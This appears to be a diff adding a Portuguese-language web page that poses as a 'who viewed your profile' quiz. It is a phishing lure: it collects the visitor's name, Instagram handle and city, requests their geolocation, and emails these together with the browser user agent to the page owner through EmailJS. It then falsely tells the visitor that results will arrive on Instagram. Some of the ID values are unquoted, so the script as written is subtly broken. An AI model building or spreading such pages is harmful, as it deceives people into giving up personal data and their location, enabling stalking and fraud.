@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+
+<html lang="pt-BR">
+
+<head>
+
+  <meta charset="UTF-8">
+
+  <title>Quem visitou seu link?</title>
+
+  <style>
+
+    body {
+
+      font-family: Arial, sans-serif;
+
+      background: #fce4ec;
+
+      padding: 30px;
+
+      text-align: center;
+
+    }
+
+    input, button {
+
+      display: block;
+
+      margin: 10px auto;
+
+      padding: 10px;
+
+      width: 80%;
+
+      max-width: 300px;
+
+    }
+
+    .hidden { display: none; }
+
+  </style>
+
+</head>
+
+<body>
+
+
+
+  <h2>👀 Quem andou vendo seu perfil?</h2>
+
+  <p>Responda o quiz abaixo para descobrir:</p>
+
+
+
+  <form id="formulario">
+
+    <input type="text" id="nome" placeholder="Seu nome">
+
+    <input type="text" id="instagram" placeholder="Seu Instagram (@usuario)">
+
+    <input type="text" id="cidade" placeholder="Sua cidade">
+
+    <button type="button" onclick="enviar()">Enviar</button>
+
+  </form>
+
+
+
+  <p id="status"></p>
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+  <script>
+
+    // Inicializa com seu User ID:
+
+    emailjs.init(Cd7H8frYvEYqT5igk); // ⬅️ Cole aqui o seu User ID
+
+
+
+    function enviar() {
+
+      var nome = document.getElementById("nome").value;
+
+      var instagram = document.getElementById("instagram").value;
+
+      var cidade = document.getElementById("cidade").value;
+
+      var status = document.getElementById("status");
+
+
+
+      if(!nome || !instagram || !cidade) {
+
+        status.innerText = "⚠️ Por favor, preencha todos os campos!";
+
+        return;
+
+      }
+
+
+
+      status.innerText = "Enviando...";
+
+
+
+      // Capturar localização (se permitido)
+
+      navigator.geolocation.getCurrentPosition(function(posicao) {
+
+        var latitude = posicao.coords.latitude;
+
+        var longitude = posicao.coords.longitude;
+
+
+
+        enviarEmail(nome, instagram, cidade, latitude, longitude);
+
+      }, function() {
+
+        enviarEmail(nome, instagram, cidade, "Não autorizada", "Não autorizada");
+
+      });
+
+    }
+
+
+
+    function enviarEmail(nome, instagram, cidade, latitude, longitude) {
+
+      var params = {
+
+        name: nome,
+
+        instagram: instagram,
+
+        city: cidade,
+
+        latitude: latitude,
+
+        longitude: longitude,
+
+        user_agent: navigator.userAgent,
+
+        date: new Date().toLocaleString()
+
+      };
+
+
+
+      emailjs.send(service_fw8qc6m,template_anbw4vj, params) // ⬅️ Cole aqui seus Service ID e Template ID
+
+        .then(function() {
+
+          document.getElementById("status").innerText = "✅ Pronto! Você vai receber o resultado no Insta em breve!";
+
+          document.getElementById("formulario").classList.add("hidden");
+
+        }, function(error) {
+
+          document.getElementById("status").innerText = "Erro ao enviar: " + JSON.stringify(error);
+
+        });
+
+    }
+
+  </script>
+
+
+
+</body>
+
+</html>
+
